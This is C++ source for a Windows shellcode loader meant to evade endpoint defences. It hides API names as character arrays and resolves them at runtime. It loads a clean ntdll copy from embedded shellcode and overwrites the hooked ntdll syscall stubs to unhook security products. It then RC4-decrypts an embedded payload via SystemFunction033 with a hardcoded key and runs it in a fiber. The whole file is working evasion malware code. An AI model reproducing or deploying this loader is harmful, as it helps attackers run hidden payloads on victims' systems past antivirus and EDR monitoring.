/*

ReflectiveNtdll (pe2shc) + SytemFunction033 + CreateFiber

*/
#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h> 
#include <string>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// decryption
using namespace std;

typedef NTSTATUS(WINAPI* _SystemFunction033)(
	struct ustring* memoryRegion,
	struct ustring* keyPointer);

struct ustring {
	DWORD Length;
	DWORD MaximumLength;
	PVOID Buffer;
} _data, key, _data2;

unsigned char sSystemFunction033[] = { 'S','y','s','t','e','m','F','u','n','c','t','i','o','n','0','3','3', 0x0 };
unsigned char sadvapi32[] = { 'a','d','v','a','p','i','3','2',0x0};

_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary((LPCSTR)sadvapi32), (LPCSTR)sSystemFunction033);

//typedefs
typedef BOOL (WINAPI * VirtualProtect_t) (LPVOID, SIZE_T, DWORD, PDWORD);
typedef LPVOID (WINAPI * VirtualAlloc_t) (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef VOID (WINAPI *RtlMoveMemory_t) (VOID UNALIGNED *Destination, const VOID UNALIGNED *Source, SIZE_T Length);
typedef LPVOID (WINAPI *ConvertThreadToFiber_t) (LPVOID lpParameter);
typedef LPVOID (WINAPI *CreateFiber_t) (SIZE_T dwStackSize, LPFIBER_START_ROUTINE lpStartAddress, LPVOID lpParameter);
typedef void (WINAPI *SwitchToFiber_t) (LPVOID lpFiber);

typedef HANDLE (WINAPI *CreateThread_t) (LPSECURITY_ATTRIBUTES lpThreadAttributes, 
	SIZE_T dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress, 
	__drv_aliasesMem LPVOID lpParameter, 
	DWORD dwCreationFlags, 
	LPDWORD lpThreadId);

typedef DWORD (WINAPI *WaitForSingleObject_t)(HANDLE hHandle, DWORD  dwMilliseconds);


//strings
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };

unsigned char sVirtualProtect[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0x0 };
unsigned char sVirtualAlloc[] = {'V','i','r','t','u','a','l','A','l','l','o','c',0x0};
unsigned char sRtlMoveMemory[] = {'R', 't', 'l', 'M', 'o', 'v', 'e', 'M', 'e', 'm', 'o', 'r', 'y', 0x0};
unsigned char sConvertThreadToFiber[] = {'C','o','n','v','e','r','t','T','h','r','e','a','d','T','o','F','i','b','e','r', 0x0};
unsigned char sCreateFiber[] = {'C','r','e','a','t','e','F','i','b','e','r', 0x0};
unsigned char sSwitchToFiber[] = {'S','w','i','t','c','h','T','o','F','i','b','e','r', 0x0};
unsigned char sCreateThread[] = {'C','r','e','a','t','e','T','h','r','e','a','d', 0x0};
unsigned char sWaitForSingleObject[] = {'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t', 0x0};


VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);
VirtualAlloc_t VirtualAlloc_p = (VirtualAlloc_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualAlloc);
RtlMoveMemory_t RtlMoveMemory_p = (RtlMoveMemory_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sRtlMoveMemory);
ConvertThreadToFiber_t ConvertThreadToFiber_p = (ConvertThreadToFiber_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sConvertThreadToFiber);
CreateFiber_t CreateFiber_p = (CreateFiber_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateFiber);
SwitchToFiber_t SwitchToFiber_p = (SwitchToFiber_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sSwitchToFiber);
CreateThread_t CreateThread_p = (CreateThread_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sCreateThread);
WaitForSingleObject_t WaitForSingleObject_p = (WaitForSingleObject_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sWaitForSingleObject);


int FindFirstSyscall(char * pMem, DWORD size)
{	
	// gets the first byte of first syscall
	DWORD i = 0;
	DWORD offset = 0;
	BYTE pattern1[] = "\x0f\x05\xc3";  // syscall ; ret
	BYTE pattern2[] = "\xcc\xcc\xcc";  // int3 * 3
	
	// find first occurance of syscall+ret instructions
	for (i = 0; i < size - 3; i++) {
		if (!memcmp(pMem + i, pattern1, 3)) {
			offset = i;
			break;
		}
	}		
	
	// now find the beginning of the syscall
	for (i = 3; i < 50 ; i++) {
		if (!memcmp(pMem + offset - i, pattern2, 3)) {
			offset = offset - i + 3;
			printf("First syscall found at 0x%p\n", pMem + offset);
			break;
		}		
	}

	return offset;
}


int FindLastSysCall(char * pMem, DWORD size) {

	// returns the last byte of the last syscall
	DWORD i;
	DWORD offset = 0;
	BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";  // syscall ; ret ; int 2e ; ret ; int3 * 3
	
	// backwards lookup
	for (i = size - 9; i > 0; i--) {
		if (!memcmp(pMem + i, pattern, 9)) {
			offset = i + 6;
			printf("Last syscall byte found at 0x%p\n", pMem + offset);
			break;
		}
	}		
	
	return offset;
}


static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pCache) {
/*
    UnhookNtdll() finds fresh "syscall table" of ntdll.dll from suspended process and copies over onto hooked one
*/
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) pCache;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) pCache + pImgDOSHead->e_lfanew);
	int i;
	
	VirtualProtect_t VirtualProtect_p = (VirtualProtect_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sVirtualProtect);
	RtlMoveMemory_t RtlMoveMemory_p = (RtlMoveMemory_t) GetProcAddress(GetModuleHandle((LPCSTR) sKernel32), (LPCSTR) sRtlMoveMemory);
	
	// find .text section
	for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char *)pImgSectionHead->Name, ".text")) {
			// prepare ntdll.dll memory region for write permissions.
			VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							PAGE_EXECUTE_READWRITE,
							&oldprotect);
			if (!oldprotect) {
					// RWX failed!
					return -1;
			}
			// copy clean "syscall table" into ntdll memory
			DWORD SC_start = FindFirstSyscall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
			DWORD SC_end = FindLastSysCall((char *) pCache, pImgSectionHead->Misc.VirtualSize);
			
			if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
				DWORD SC_size = SC_end - SC_start;
				//printf("dst (in ntdll): %p\n", ((DWORD_PTR) hNtdll + SC_start));
				//printf("src (in cache): %p\n", ((DWORD_PTR) pCache + SC_start));
				//printf("size: %i\n", SC_size);
				//getchar();
				RtlMoveMemory_p( (LPVOID)((DWORD_PTR) hNtdll + SC_start),
						(LPVOID)((DWORD_PTR) pCache + + SC_start),
						SC_size);
			}

			// restore original protection settings of ntdll
			VirtualProtect_p((LPVOID)((DWORD_PTR) hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							oldprotect,
							&oldprotect);
			if (!oldprotect) {
					// it failed
					return -1;
			}
			return 0;
		}
	}
	
	// failed? .text not found!
	return rand();
}


#include "win10-ntdll_22H2_19045-2486.h"
//#include "win11-ntdll_22H2_22621-1105.h"
#include "enc_shellcode.h"

int main(VOID)
{
	PVOID mainFiber = ConvertThreadToFiber_p(NULL);

	unsigned int shellcode_size = sizeof(enc_shellcode);
	
	unsigned int raw_ntdll_len = sizeof(win10_ntdll_22H2_19045_2486_shellcode);
	
	//Trying initializing with rand()
	int pid = 0;
	HANDLE hProc = NULL;
	PVOID exec_mem = NULL;
	HANDLE hFile = NULL;
	DWORD oldprotect = 0;
	
	//Make executable memory
	exec_mem = VirtualAlloc_p(NULL, raw_ntdll_len, MEM_COMMIT, PAGE_READWRITE);
	RtlMoveMemory_p(exec_mem, win10_ntdll_22H2_19045_2486_shellcode, raw_ntdll_len);
	VirtualProtect_p(exec_mem, raw_ntdll_len, PAGE_EXECUTE_READWRITE, &oldprotect);
	
	//Create Sacrificial Thread
	hFile = CreateThread_p(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);

	// create a fiber that will execute the shellcode
	//PVOID ntdllFiber = CreateFiber_p(NULL, (LPFIBER_START_ROUTINE)exec_mem, NULL);

	// manually schedule the fiber that will execute our shellcode
	//SwitchToFiber_p(ntdllFiber);

	WaitForSingleObject_p(hFile, -1);
	
	printf("[*] Removing hooks...\n");
	//getchar();
	
	//UnhookNtdll
	UnhookNtdll(GetModuleHandle((LPCSTR) sNtdll), exec_mem);
	
	//printf("Check hooks");
	//getchar();
	
	printf("[*] Completed loading ntdll!\n"); getchar();

	// Decryption shellcode
	char _key[] = "alphaBetagamma";

	PVOID buffer = VirtualAlloc_p(NULL, shellcode_size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// Copy the character array to the allocated memory using memcpy.
	std::memcpy(buffer, enc_shellcode, shellcode_size);

	key.Buffer = (&_key);
	key.Length = sizeof(_key);

	_data.Buffer = buffer;
	_data.Length = shellcode_size;

	//printf("2"); getchar();

	// Decrypting shellcode
	SystemFunction033(&_data, &key);
	DWORD oldProtect = 0;

	printf("[*] Creating a fiber that will execute the shellcode...\n");

	// create a fiber that will execute the shellcode
	PVOID shellcodeFiber = CreateFiber_p(NULL, (LPFIBER_START_ROUTINE)buffer, NULL);

	// manually schedule the fiber that will execute our shellcode
	SwitchToFiber_p(shellcodeFiber);
	
	return 0;
}
